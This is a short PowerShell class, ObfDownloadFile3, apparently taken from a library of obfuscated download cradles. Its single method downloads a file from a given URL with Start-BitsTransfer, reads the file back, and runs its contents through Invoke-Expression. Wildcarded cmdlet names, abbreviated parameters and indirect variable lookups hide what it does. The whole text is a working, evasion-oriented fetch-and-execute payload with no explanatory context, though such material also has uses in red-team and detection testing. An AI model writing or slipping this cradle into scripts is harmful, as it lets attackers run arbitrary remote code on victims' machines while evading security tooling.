Class ObfDownloadFile3 {

    static Execute ([String]$url, [String]$path) {
        SI Variable:\H $path;SV 0 $url;$NULL=Help(Get-Command Sta*Bi*);.(Get-Command Sta*Bi*)-Sou (Get-Variable 0 -ValueO) -Destinat (Get-ChildItem Variable:H).Value;.$ExecutionContext.(($ExecutionContext|Get-Member)[6].Name).GetCmdlets('In*-Ex*ion')(-Join([IO.File]::ReadAllBytes((Get-ChildItem Variable:H).Value)|ForEach{[Char](GV _ -ValueOn)}))
    }
}